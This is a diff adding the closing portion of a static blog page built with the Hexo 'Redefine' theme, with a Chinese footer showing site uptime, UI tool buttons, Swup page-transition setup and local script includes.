+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
